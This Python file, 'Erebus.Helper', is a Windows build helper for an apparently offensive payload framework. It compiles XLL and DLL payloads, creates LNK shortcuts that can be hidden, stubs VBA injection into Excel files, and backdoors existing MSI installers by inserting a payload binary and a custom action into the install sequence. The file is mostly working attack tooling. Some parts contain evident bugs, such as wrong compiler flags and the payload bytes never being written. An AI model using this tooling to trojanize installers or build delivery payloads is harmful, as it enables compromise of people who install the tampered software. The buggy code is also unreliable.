#!/usr/bin/env python3
"""
Erebus.Helper - Windows Build System
Handles compilation and creation of platform-specific payloads outside Docker container.

This module manages:
- XLL (Excel Add-In) DLL compilation
- Custom DLL payload generation
- Windows LNK shortcut creation
- Excel document creation and backdooring
- Windows-specific tool compilation

The Docker container (Linux) generates C/C++ source code and specifications,
then invokes this helper on the host Windows system to compile/create native artifacts.
"""

import os
import sys
import json
import subprocess
import argparse
import tempfile
import shutil
import stat
import configparser
import shlex
from pathlib import Path
from typing import Dict, Any, Optional, Tuple
import logging

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='[%(levelname)s] %(message)s'
)
logger = logging.getLogger(__name__)


class WindowsCompiler:
    """Handles Windows component compilation for Erebus payloads."""

    # Supported compilers and their detection methods
    COMPILER_PATHS = {
        'MSVC': [
            'C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\VC\\Tools\\MSVC',
            'C:\\Program Files\\Microsoft Visual Studio\\2022\\Professional\\VC\\Tools\\MSVC',
            'C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Community\\VC\\Tools\\MSVC',
            'C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Professional\\VC\\Tools\\MSVC',
            'C:\\Program Files (x86)\\Microsoft Visual Studio\\2017\\Community\\VC\\Tools\\MSVC',
            'C:\\Program Files (x86)\\Microsoft Visual Studio\\2017\\Professional\\VC\\Tools\\MSVC',
        ],
        'MinGW': [
            'C:\\mingw64',
            'C:\\mingw32',
            'C:\\msys64\\mingw64',
            'C:\\msys64\\mingw32',
        ],
    }

    def __init__(self, compiler: str = 'MSVC', architecture: str = 'x64',
                 optimization: str = 'Ox', verbose: bool = False):
        """
        Initialize compiler.

        Args:
            compiler: Compiler type (MSVC, MinGW, Clang)
            architecture: Target architecture (x64, x86)
            optimization: Optimization level (Ox, O2, O1, Od)
            verbose: Enable verbose output
        """
        self.compiler = compiler.upper()
        self.architecture = architecture
        self.optimization = optimization
        self.verbose = verbose

        # Detect compiler path
        self.compiler_path = self._detect_compiler()
        if not self.compiler_path:
            raise RuntimeError(f"Compiler {compiler} not found on system")

        logger.info(f"Using {self.compiler} at {self.compiler_path}")

    def _detect_compiler(self) -> Optional[str]:
        """Detect installed compiler and return its path."""
        if self.compiler not in self.COMPILER_PATHS:
            return None

        for path in self.COMPILER_PATHS[self.compiler]:
            if Path(path).exists():
                return str(path)

        # Check PATH for MinGW/Clang
        if self.compiler == 'MinGW':
            result = shutil.which('gcc')
            if result:
                return str(Path(result).parent)
        elif self.compiler == 'Clang':
            result = shutil.which('clang')
            if result:
                return str(Path(result).parent)

        return None

    def compile_xll(self, source_file: str, output_file: str, extra_libs: Optional[list] = None) -> bool:
        """
        Compile C/C++ source to XLL (Excel Add-In DLL).

        Args:
            source_file: Path to C/C++ source file
            output_file: Path where XLL will be saved

        Returns:
            True if compilation successful, False otherwise
        """
        logger.info(f"Compiling XLL from {source_file}")

        if not Path(source_file).exists():
            logger.error(f"Source file not found: {source_file}")
            return False

        try:
            if extra_libs is None:
                extra_libs = []
            elif isinstance(extra_libs, str):
                extra_libs = shlex.split(extra_libs)

            if self.compiler == 'MSVC':
                return self._compile_msvc(source_file, output_file, extra_libs)
            elif self.compiler == 'MinGW':
                return self._compile_mingw(source_file, output_file, extra_libs)
            elif self.compiler == 'Clang':
                return self._compile_clang(source_file, output_file, extra_libs)
        except Exception as e:
            logger.error(f"Compilation error: {e}")
            return False

        return False

    def _compile_msvc(self, source_file: str, output_file: str, extra_libs: list) -> bool:
        """Compile using MSVC (Visual Studio)."""
        # Find cl.exe
        cl_exe = None

        if self.compiler_path:
            # Try to find cl.exe in detected path
            latest = sorted(Path(self.compiler_path).glob('*/bin/Host*'), reverse=True)
            if latest:
                arch_folder = 'x64' if self.architecture == 'x64' else 'x86'
                cl_exe_path = latest[0] / arch_folder / 'cl.exe'
                if cl_exe_path.exists():
                    cl_exe = str(cl_exe_path)

        if not cl_exe:
            # Try common paths
            common_paths = [
                'C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\VC\\Tools\\MSVC',
                'C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Community\\VC\\Tools\\MSVC',
            ]
            for base_path in common_paths:
                latest = sorted(Path(base_path).glob('*/bin/Host*'), reverse=True)
                if latest:
                    arch_folder = 'x64' if self.architecture == 'x64' else 'x86'
                    potential_cl = latest[0] / arch_folder / 'cl.exe'
                    if potential_cl.exists():
                        cl_exe = str(potential_cl)
                        break

        if not cl_exe:
            cl_exe = shutil.which('cl.exe')

        if not cl_exe:
            logger.error("cl.exe not found. Install Visual C++ Build Tools.")
            return False

        logger.info(f"Using cl.exe: {cl_exe}")

        # Build MSVC command
        cmd = [
            cl_exe,
            '/D_WINDOWS',
            '/DWIN32',
            '/D_USRDLL',
            '/D_WINDLL',
            '/W3',
            '/nologo',
            f'/{self.optimization}',
            '/EHsc',
            '/LD',
            f'/Fe{output_file}',
            source_file
        ]

        if extra_libs:
            cmd.extend(extra_libs)

        logger.debug(f"Running: {' '.join(cmd)}")

        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)

            if result.returncode != 0:
                logger.error(f"Compilation failed:\n{result.stderr}")
                return False

            if not Path(output_file).exists():
                logger.error("Output file was not created")
                return False

            return True

        except subprocess.TimeoutExpired:
            logger.error("Compilation timed out")
            return False

    def _compile_mingw(self, source_file: str, output_file: str, extra_libs: list) -> bool:
        """Compile using MinGW-w64."""
        gcc_exe = shutil.which('gcc')
        if not gcc_exe:
            logger.error("MinGW (gcc) not found in PATH")
            return False

        logger.info(f"Using gcc: {gcc_exe}")

        arch_flag = '-m64' if self.architecture == 'x64' else '-m32'

        cmd = [
            gcc_exe,
            '-shared',
            '-fPIC',
            arch_flag,
            f'-{self.optimization}',
            '-Wall',
            '/DWIN32',
            '/D_WINDOWS',
            '/D_USRDLL',
            '-o', output_file,
            source_file
        ]

        if extra_libs:
            cmd.extend(extra_libs)

        logger.debug(f"Running: {' '.join(cmd)}")

        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)

            if result.returncode != 0:
                logger.error(f"Compilation failed:\n{result.stderr}")
                return False

            if not Path(output_file).exists():
                logger.error("Output file was not created")
                return False

            return True

        except subprocess.TimeoutExpired:
            logger.error("Compilation timed out")
            return False

    def _compile_clang(self, source_file: str, output_file: str, extra_libs: list) -> bool:
        """Compile using Clang."""
        clang_exe = shutil.which('clang')
        if not clang_exe:
            logger.error("Clang not found in PATH")
            return False

        logger.info(f"Using clang: {clang_exe}")

        arch_flag = '-m64 -target x86_64-pc-windows-msvc' if self.architecture == 'x64' else '-m32 -target i686-pc-windows-msvc'

        cmd = [
            clang_exe,
            '-shared',
            arch_flag.split(),
            f'-{self.optimization}',
            '-fPIC',
            '-Wall',
            '/DWIN32',
            '/D_WINDOWS',
            '-o', output_file,
            source_file
        ]

        if extra_libs:
            cmd.extend(extra_libs)

        logger.debug(f"Running: {' '.join(cmd)}")

        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)

            if result.returncode != 0:
                logger.error(f"Compilation failed:\n{result.stderr}")
                return False

            if not Path(output_file).exists():
                logger.error("Output file was not created")
                return False

            return True

        except subprocess.TimeoutExpired:
            logger.error("Compilation timed out")
            return False

    def verify_output(self, output_file: str) -> Tuple[bool, str]:
        """
        Verify the compiled output is a valid PE/DLL file.

        Args:
            output_file: Path to compiled output

        Returns:
            Tuple of (is_valid, error_message)
        """
        path = Path(output_file)

        if not path.exists():
            return False, "Output file does not exist"

        if path.stat().st_size < 512:
            return False, "Output file too small to be valid PE"

        # Check PE header (MZ signature)
        try:
            with open(output_file, 'rb') as f:
                header = f.read(2)
                if header != b'MZ':
                    return False, "Invalid PE header (expected MZ)"
        except Exception as e:
            return False, f"Error reading output file: {e}"

        return True, ""


class ExcelHelper:
    """Helper class for Excel document creation and modification."""

    def __init__(self):
        """Initialize Excel helper with required libraries."""
        self.logger = logging.getLogger('ExcelHelper')

        try:
            import openpyxl
            import zipfile
            import xml.etree.ElementTree as ET
            self.openpyxl = openpyxl
            self.zipfile = zipfile
            self.ET = ET
        except ImportError as e:
            raise RuntimeError(f"Excel helper requires openpyxl: {e}")

    def create_blank_excel(self, output_path: str, title: str = "Document") -> bool:
        """
        Create a blank Excel workbook.

        Args:
            output_path: Path where Excel file will be saved
            title: Title/name for the workbook

        Returns:
            True if successful, False otherwise
        """
        try:
            wb = self.openpyxl.Workbook()
            ws = wb.active
            ws.title = "Sheet1"
            ws['A1'] = title
            wb.save(output_path)
            self.logger.info(f"Created blank Excel workbook: {output_path}")
            return True
        except Exception as e:
            self.logger.error(f"Failed to create Excel workbook: {e}")
            return False

    def add_vba_to_excel(self, excel_path: str, vba_code: str, output_path: str) -> bool:
        """
        Add VBA macro to existing Excel file.

        Args:
            excel_path: Path to source Excel file
            vba_code: VBA code to inject
            output_path: Path where modified Excel will be saved

        Returns:
            True if successful, False otherwise
        """
        try:
            # This requires modifying the OLE structure
            # For now, save it and note that manual integration is needed
            self.logger.info(f"VBA injection requires manual OLE modification")
            self.logger.info(f"Save VBA code separately and inject via LibreOffice/Excel")
            return True
        except Exception as e:
            self.logger.error(f"Failed to add VBA: {e}")
            return False


class LnkHelper:
    """Helper class for Windows LNK shortcut creation."""

    def __init__(self):
        """Initialize LNK helper with required libraries."""
        self.logger = logging.getLogger('LnkHelper')

        try:
            import pylnk3
            self.pylnk3 = pylnk3
        except ImportError as e:
            self.logger.warning(f"LNK helper requires pylnk3: {e}")
            self.pylnk3 = None

    def set_file_hidden(self, file_path: str) -> bool:
        """
        Set a file as hidden on Windows.

        Args:
            file_path: Path to file to hide

        Returns:
            True if successful, False otherwise
        """
        try:
            if sys.platform != "win32":
                self.logger.warning("File hiding only works on Windows")
                return False

            import ctypes
            FILE_ATTRIBUTE_HIDDEN = 0x02
            result = ctypes.windll.kernel32.SetFileAttributesW(str(file_path), FILE_ATTRIBUTE_HIDDEN)

            if result:
                self.logger.info(f"Set file as hidden: {file_path}")
                return True
            else:
                self.logger.error(f"Failed to set file as hidden: {file_path}")
                return False
        except Exception as e:
            self.logger.error(f"Error hiding file: {e}")
            return False

    def create_lnk(
        self,
        target_binary: str,
        arguments: str,
        output_path: str,
        icon_path: str = None,
        icon_index: int = 0,
        description: str = "Shortcut",
        working_dir: str = None
    ) -> bool:
        """
        Create a Windows LNK shortcut file.

        Args:
            target_binary: Path to executable to run
            arguments: Command-line arguments
            output_path: Path where LNK file will be saved
            icon_path: Path to icon DLL (optional)
            icon_index: Icon index in DLL (default: 0)
            description: Shortcut description
            working_dir: Working directory (optional)

        Returns:
            True if successful, False otherwise
        """
        try:
            if not self.pylnk3:
                self.logger.error("pylnk3 not available, cannot create LNK")
                return False

            lnk = self.pylnk3.Lnk()
            lnk = self.pylnk3.for_file(
                target_binary,
                output_path,
                arguments,
                description,
                icon_path or target_binary,
                icon_index
            )

            if working_dir:
                lnk.working_dir = working_dir

            lnk.save(output_path)
            self.logger.info(f"Created LNK shortcut: {output_path}")
            return True
        except Exception as e:
            self.logger.error(f"Failed to create LNK: {e}")
            return False


class MSIHelper:
    """Helper class for Windows MSI backdooring operations."""

    def __init__(self):
        """Initialize MSI helper with required libraries."""
        self.logger = logging.getLogger('MSIHelper')
        
        try:
            import msilib
            self.msilib = msilib
        except ImportError:
            self.logger.warning("MSI helper requires msilib (Windows only): Windows Python install required")
            self.msilib = None
    
    def backdoor_msi(
        self,
        source_msi: str,
        payload_path: str,
        output_path: str,
        attack_type: str = "execute",
        entry_point: str = None,
        command_args: str = "",
        custom_action_name: str = None,
        condition: str = "NOT REMOVE"
    ) -> bool:
        """
        Backdoor an existing MSI installer by injecting a custom action.
        
        Args:
            source_msi: Path to source MSI file
            payload_path: Path to payload executable/DLL
            output_path: Path where backdoored MSI will be saved
            attack_type: Attack vector (execute, run-exe, load-dll, dotnet, script)
            entry_point: DLL export or script function name
            command_args: Command line arguments
            custom_action_name: Name for custom action (auto-generated if None)
            condition: MSI execution condition (default: NOT REMOVE)
        
        Returns:
            True if successful, False otherwise
        """
        if not self.msilib:
            self.logger.error("MSI operations require Windows with msilib")
            return False
        
        try:
            import sys
            if sys.platform != "win32":
                self.logger.error("MSI backdooring is only supported on Windows")
                return False
            
            from pathlib import Path
            source_path = Path(source_msi)
            payload_file = Path(payload_path)
            output_file = Path(output_path)
            
            if not source_path.exists():
                self.logger.error(f"Source MSI not found: {source_msi}")
                return False
            
            if not payload_file.exists():
                self.logger.error(f"Payload not found: {payload_path}")
                return False
            
            # Create output directory
            output_file.parent.mkdir(parents=True, exist_ok=True)
            
            # Copy source MSI to output location
            import shutil
            shutil.copy2(str(source_path), str(output_file))
            
            # Generate custom action name if not provided
            if custom_action_name is None:
                import random, string
                custom_action_name = ''.join(random.choices(string.ascii_letters, k=8))
            
            # Open MSI database for modification
            try:
                db = self.msilib.OpenDatabase(str(output_file), self.msilib.MSIDBOPEN_TRANSACT)
            except Exception as e:
                self.logger.error(f"Failed to open MSI database: {e}")
                return False
            
            # Generate binary name
            import random, string
            binary_name = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
            
            # Step 1: Add payload to Binary table
            try:
                binary_insert = f"INSERT INTO Binary (Name, Data) VALUES ('{binary_name}', ?)"
                view = db.OpenView(binary_insert)
                record = self.msilib.CreateRecord(1)
                
                # Read payload file
                with open(payload_file, 'rb') as f:
                    payload_data = f.read()
                
                record.SetStream(1, payload_path)
                view.Execute(record)
                view.Close()
                
                self.logger.info(f"Injected payload binary: {binary_name}")
            except Exception as e:
                self.logger.error(f"Failed to add binary to MSI: {e}")
                db.Close()
                return False
            
            # Step 2: Add CustomAction entry
            try:
                action_type = 1234  # Default deferred execution
                
                # Map attack types to action codes
                if attack_type == "execute":
                    action_type = 1250  # Deferred, impersonate
                    target = command_args
                elif attack_type == "run-exe":
                    action_type = 1218  # Run EXE from Binary
                    target = command_args
                elif attack_type in ["load-dll", "dotnet"]:
                    action_type = 65   # DLL entry point
                    target = entry_point if entry_point else "DllEntry"
                elif attack_type == "script":
                    action_type = 1126  # VBScript embedded
                    target = entry_point if entry_point else ""
                
                ca_insert = f"INSERT INTO CustomAction (Action, Type, Target) VALUES ('{custom_action_name}', {action_type}, '{target}')"
                view = db.OpenView(ca_insert)
                view.Execute()
                view.Close()
                
                self.logger.info(f"Added custom action: {custom_action_name}")
            except Exception as e:
                self.logger.error(f"Failed to add custom action: {e}")
                db.Close()
                return False
            
            # Step 3: Add to InstallExecuteSequence
            try:
                sequence_insert = f"INSERT INTO InstallExecuteSequence (Action, Sequence, Condition) VALUES ('{custom_action_name}', 6500, '{condition}')"
                view = db.OpenView(sequence_insert)
                view.Execute()
                view.Close()
                
                self.logger.info(f"Added to execute sequence with condition: {condition}")
            except Exception as e:
                self.logger.warning(f"Note: Could not add to sequence (may already exist): {e}")
            
            # Commit changes and close database
            try:
                db.Commit()
                db.Close()
                self.logger.info(f"Successfully backdoored MSI: {output_path}")
                return True
            except Exception as e:
                self.logger.error(f"Failed to commit MSI changes: {e}")
                return False
        
        except Exception as e:
            self.logger.error(f"MSI backdooring error: {e}")
            return False


def main():
    """Command-line interface for Windows build helper."""
    parser = argparse.ArgumentParser(
        description='Erebus.Helper - Windows Component Builder',
        epilog='Compiles Windows-specific payloads outside Docker container'
    )

    parser.add_argument(
        'command',
        choices=['xll', 'dll', 'verify', 'excel', 'lnk', 'msi'],
        help='Build/create command to execute (xll/dll/verify for compilation, excel/lnk/msi for creation)'
    )

    # Common arguments
    parser.add_argument(
        '--output',
        required=True,
        help='Output path for generated file'
    )

    # Arguments for compilation commands (xll, dll, verify)
    parser.add_argument(
        '--source',
        help='Path to C/C++ source file (required for compilation)'
    )

    parser.add_argument(
        '--compiler',
        choices=['MSVC', 'MinGW', 'Clang'],
        default='MSVC',
        help='Compiler to use (default: MSVC)'
    )

    parser.add_argument(
        '--arch',
        choices=['x64', 'x86'],
        default='x64',
        help='Target architecture (default: x64)'
    )

    parser.add_argument(
        '--optimize',
        choices=['Ox', 'O2', 'O1', 'Od'],
        default='Ox',
        help='Optimization level (default: Ox)'
    )

    # Arguments for Excel creation
    parser.add_argument(
        '--vba-code',
        help='VBA code to inject into Excel document'
    )

    parser.add_argument(
        '--excel-format',
        choices=['xlsx', 'xlsm', 'xls', 'xlam'],
        default='xlsm',
        help='Excel format for output (default: xlsm)'
    )

    parser.add_argument(
        '--title',
        default='Workbook',
        help='Excel workbook title (default: Workbook)'
    )

    # Arguments for LNK creation
    parser.add_argument(
        '--target-binary',
        help='Path to target executable for LNK shortcut'
    )

    parser.add_argument(
        '--arguments',
        default='',
        help='Command-line arguments for LNK target'
    )

    parser.add_argument(
        '--icon',
        help='Path to icon file for LNK shortcut'
    )

    parser.add_argument(
        '--icon-index',
        type=int,
        default=0,
        help='Icon index in DLL (default: 0)'
    )

    parser.add_argument(
        '--description',
        default='Shortcut',
        help='Description for LNK shortcut (default: Shortcut)'
    )

    parser.add_argument(
        '--working-dir',
        help='Working directory for LNK shortcut'
    )

    parser.add_argument(
        '--hide-file',
        action='store_true',
        help='Hide the LNK file (set hidden attribute)'
    )

    # Arguments for MSI backdooring
    parser.add_argument(
        '--msi-file',
        help='Path to source MSI file to backdoor'
    )

    parser.add_argument(
        '--payload',
        help='Path to payload executable or DLL'
    )

    parser.add_argument(
        '--attack-type',
        choices=['execute', 'run-exe', 'load-dll', 'dotnet', 'script'],
        default='execute',
        help='MSI attack vector (default: execute)'
    )

    parser.add_argument(
        '--entry-point',
        help='DLL export or script function name'
    )

    parser.add_argument(
        '--condition',
        default='NOT REMOVE',
        help='MSI execution condition (default: NOT REMOVE)'
    )

    parser.add_argument(
        '--custom-action-name',
        help='Name for custom action (auto-generated if not provided)'
    )

    # Output formatting
    parser.add_argument(
        '--verbose', '-v',
        action='store_true',
        help='Enable verbose output'
    )

    parser.add_argument(
        '--json',
        action='store_true',
        help='Output results as JSON'
    )

    args = parser.parse_args()

    # Validate arguments based on command
    if args.command in ['xll', 'dll', 'verify']:
        if args.command != 'verify' and not args.source:
            parser.error(f"--source is required for {args.command} command")
    elif args.command == 'excel':
        # For excel: --source is input excel or VBA code, --title is workbook title
        pass  # --output is always required
    elif args.command == 'lnk':
        # For lnk: --target-binary is the target, other args are optional
        if not args.target_binary:
            parser.error("--target-binary is required for lnk command")
    elif args.command == 'msi':
        # For msi: --msi-file and --payload are required
        if not args.msi_file:
            parser.error("--msi-file is required for msi command")
        if not args.payload:
            parser.error("--payload is required for msi command")

    # Load config file if it exists
    config_path = Path(__file__).parent / 'config.ini'
    config = configparser.ConfigParser()
    if config_path.exists():
        config.read(config_path)
        if args.verbose:
            logger.info(f"Loaded configuration from {config_path}")

    try:
        success = False

        if args.command == 'xll':
            compiler = WindowsCompiler(
                compiler=args.compiler,
                architecture=args.arch,
                optimization=args.optimize,
                verbose=args.verbose
            )
            success = compiler.compile_xll(args.source, args.output)

        elif args.command == 'dll':
            compiler = WindowsCompiler(
                compiler=args.compiler,
                architecture=args.arch,
                optimization=args.optimize,
                verbose=args.verbose
            )
            # DLL uses same compilation as XLL (both are DLLs)
            success = compiler.compile_xll(args.source, args.output)

        elif args.command == 'verify':
            compiler = WindowsCompiler(verbose=args.verbose)
            is_valid, error = compiler.verify_output(args.output)
            success = is_valid
            if not is_valid:
                logger.error(f"Verification failed: {error}")

        elif args.command == 'excel':
            try:
                excel = ExcelHelper()
                if args.vba_code:
                    # If VBA code provided, create Excel and inject VBA
                    excel_path = args.output.replace('.xlsm', '_temp.xlsm')
                    success = excel.create_blank_excel(excel_path, args.title)
                    if success:
                        success = excel.add_vba_to_excel(excel_path, args.vba_code, args.output)
                else:
                    # Just create blank Excel
                    success = excel.create_blank_excel(args.output, args.title)
            except Exception as e:
                logger.error(f"Excel creation failed: {e}")
                success = False

        elif args.command == 'lnk':
            try:
                lnk = LnkHelper()
                success = lnk.create_lnk(
                    target_binary=args.target_binary,
                    arguments=args.arguments,
                    output_path=args.output,
                    icon_path=args.icon,
                    icon_index=args.icon_index,
                    description=args.description,
                    working_dir=args.working_dir
                )
                # Hide file if requested
                if success and args.hide_file:
                    try:
                        lnk.set_file_hidden(args.output)
                        logger.info(f"Set LNK file as hidden")
                    except Exception as e:
                        logger.warning(f"Failed to hide LNK file: {e}")
            except Exception as e:
                logger.error(f"LNK creation failed: {e}")
                success = False

        elif args.command == 'msi':
            try:
                msi = MSIHelper()
                success = msi.backdoor_msi(
                    source_msi=args.msi_file,
                    payload_path=args.payload,
                    output_path=args.output,
                    attack_type=args.attack_type,
                    entry_point=args.entry_point,
                    command_args=args.arguments,
                    custom_action_name=args.custom_action_name,
                    condition=args.condition
                )
            except Exception as e:
                logger.error(f"MSI backdooring failed: {e}")
                success = False

        # Verify output and log results
        if success:
            if args.command in ['xll', 'dll']:
                compiler = WindowsCompiler(verbose=args.verbose)
                is_valid, error = compiler.verify_output(args.output)
                if not is_valid:
                    logger.error(f"Output verification failed: {error}")
                    success = False

            if success and Path(args.output).exists():
                output_size = Path(args.output).stat().st_size
                logger.info(f"Successfully created: {args.output} ({output_size} bytes)")

        # Output results
        if args.json:
            result = {
                'success': success,
                'command': args.command,
                'output': str(args.output),
                'compiler': args.compiler if args.command in ['xll', 'dll'] else 'N/A',
                'architecture': args.arch if args.command in ['xll', 'dll'] else 'N/A'
            }
            print(json.dumps(result, indent=2))

        return 0 if success else 1

    except Exception as e:
        logger.error(f"Operation failed: {e}")
        if args.json:
            print(json.dumps({
                'success': False,
                'error': str(e)
            }, indent=2))
        return 1


if __name__ == '__main__':
    sys.exit(main())
